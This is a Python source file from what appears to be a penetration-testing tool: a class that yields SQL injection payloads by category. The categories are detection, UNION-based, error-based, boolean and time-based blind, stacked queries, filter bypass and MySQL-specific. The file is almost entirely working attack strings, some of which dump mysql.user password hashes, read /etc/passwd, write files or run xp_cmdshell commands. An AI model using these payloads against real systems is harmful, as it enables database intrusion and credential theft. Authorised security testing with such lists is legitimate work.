"""
AIPT SQL Injection Payloads

SQL injection payloads for security testing.
"""
from __future__ import annotations

from typing import Iterator


class SQLiPayloads:
    """
    SQL injection payload generator.

    Categories:
    - Detection: Identify SQLi vulnerabilities
    - Union-based: UNION SELECT extraction
    - Error-based: Extract data via errors
    - Blind: Boolean and time-based
    - Stacked queries: Multiple statements

    Example:
        sqli = SQLiPayloads()

        # Test for SQLi
        for payload in sqli.detection():
            if vulnerable(test(payload)):
                exploit()
    """

    @classmethod
    def detection(cls) -> Iterator[str]:
        """Payloads to detect SQLi vulnerabilities"""
        payloads = [
            # Basic tests
            "'",
            '"',
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'#",
            "' OR '1'='1'/*",
            '" OR "1"="1',
            '" OR "1"="1"--',

            # Numeric
            "1 OR 1=1",
            "1 OR 1=1--",
            "1' OR '1'='1",

            # Comment-based
            "'--",
            "'#",
            "'/*",
            "' ;--",

            # Tautology
            "' OR 1=1--",
            "' OR 'x'='x",
            "' OR 1 --",
            "') OR ('1'='1",

            # Syntax error triggers
            "'\"",
            "' AND '1'='2",
            "' AND '1'='1",

            # NULL byte
            "%00' OR '1'='1",

            # Double URL encoding
            "%2527",
        ]
        yield from payloads

    @classmethod
    def union_based(cls, columns: int = 5) -> Iterator[str]:
        """UNION-based extraction payloads"""
        null_cols = ",".join(["NULL"] * columns)

        payloads = [
            # Basic UNION
            f"' UNION SELECT {null_cols}--",
            f'" UNION SELECT {null_cols}--',
            f"' UNION SELECT {null_cols}#",
            f"' UNION ALL SELECT {null_cols}--",

            # With information extraction
            f"' UNION SELECT {','.join(['@@version' if i == 0 else 'NULL' for i in range(columns)])}--",
            f"' UNION SELECT {','.join(['user()' if i == 0 else 'NULL' for i in range(columns)])}--",
            f"' UNION SELECT {','.join(['database()' if i == 0 else 'NULL' for i in range(columns)])}--",

            # Order by for column enumeration
            "' ORDER BY 1--",
            "' ORDER BY 2--",
            "' ORDER BY 5--",
            "' ORDER BY 10--",
            "' ORDER BY 100--",
        ]

        # Column count enumeration
        for i in range(1, 20):
            cols = ",".join(["NULL"] * i)
            payloads.append(f"' UNION SELECT {cols}--")

        yield from payloads

    @classmethod
    def error_based(cls) -> Iterator[str]:
        """Error-based extraction payloads"""
        payloads = [
            # MySQL
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--",

            # PostgreSQL
            "' AND 1=CAST((SELECT version()) AS INT)--",

            # MSSQL
            "' AND 1=CONVERT(INT,(SELECT @@version))--",

            # Oracle
            "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--",
        ]
        yield from payloads

    @classmethod
    def blind_boolean(cls) -> Iterator[str]:
        """Boolean-based blind injection payloads"""
        payloads = [
            # True conditions
            "' AND 1=1--",
            "' AND 'a'='a",
            "' AND 1--",
            "' AND 1=1 AND ''='",

            # False conditions
            "' AND 1=2--",
            "' AND 'a'='b",
            "' AND 0--",

            # Substring extraction
            "' AND SUBSTRING(@@version,1,1)='5'--",
            "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",

            # Conditional
            "' AND IF(1=1,1,0)--",
            "' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)--",
        ]
        yield from payloads

    @classmethod
    def blind_time(cls) -> Iterator[str]:
        """Time-based blind injection payloads"""
        payloads = [
            # MySQL
            "' AND SLEEP(5)--",
            "' AND BENCHMARK(5000000,MD5('test'))--",
            "' OR IF(1=1,SLEEP(5),0)--",

            # PostgreSQL
            "'; SELECT pg_sleep(5)--",
            "' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(5) END)--",

            # MSSQL
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND 1=(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END WAITFOR DELAY '0:0:5')--",

            # Oracle
            "' AND 1=(SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) END FROM dual)--",
        ]
        yield from payloads

    @classmethod
    def stacked_queries(cls) -> Iterator[str]:
        """Stacked query payloads"""
        payloads = [
            # Information gathering
            "'; SELECT @@version;--",
            "'; SELECT user();--",
            "'; SELECT database();--",

            # MSSQL specific
            "'; EXEC xp_cmdshell('whoami');--",

            # PostgreSQL specific
            "'; CREATE TABLE aipt_test(data text);--",
            "'; COPY aipt_test FROM '/etc/passwd';--",
        ]
        yield from payloads

    @classmethod
    def bypass_filters(cls) -> Iterator[str]:
        """Filter bypass payloads"""
        payloads = [
            # Case variations
            "' oR '1'='1",
            "' OR '1'='1",
            "' Or '1'='1",

            # Inline comments
            "'/**/OR/**/1=1--",
            "' UN/**/ION SEL/**/ECT NULL--",
            "' UNION/**/SELECT/**/NULL--",

            # Encoding
            "' %4fR '1'='1",  # OR
            "' %55NION %53ELECT NULL--",  # UNION SELECT

            # Using functions
            "' OR CHAR(49)=CHAR(49)--",
            "' OR ASCII('1')=49--",

            # Whitespace alternatives
            "'\tOR\t'1'='1",
            "'\nOR\n'1'='1",
            "' OR\r\n'1'='1",

            # No spaces
            "'OR'1'='1'",
            "'||'1'='1",

            # Scientific notation
            "' OR 1e0=1e0--",
        ]
        yield from payloads

    @classmethod
    def mysql_specific(cls) -> Iterator[str]:
        """MySQL-specific payloads"""
        payloads = [
            # Version
            "' UNION SELECT @@version--",
            "' UNION SELECT VERSION()--",

            # Users
            "' UNION SELECT user FROM mysql.user--",
            "' UNION SELECT CONCAT(user,':',password) FROM mysql.user--",

            # Databases
            "' UNION SELECT schema_name FROM information_schema.schemata--",

            # Tables
            "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",

            # Columns
            "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",

            # File operations
            "' UNION SELECT LOAD_FILE('/etc/passwd')--",
            "' INTO OUTFILE '/tmp/test.txt'--",
        ]
        yield from payloads

    @classmethod
    def all(cls) -> Iterator[str]:
        """All SQLi payloads"""
        yield from cls.detection()
        yield from cls.union_based()
        yield from cls.error_based()
        yield from cls.blind_boolean()
        yield from cls.blind_time()
        yield from cls.bypass_filters()
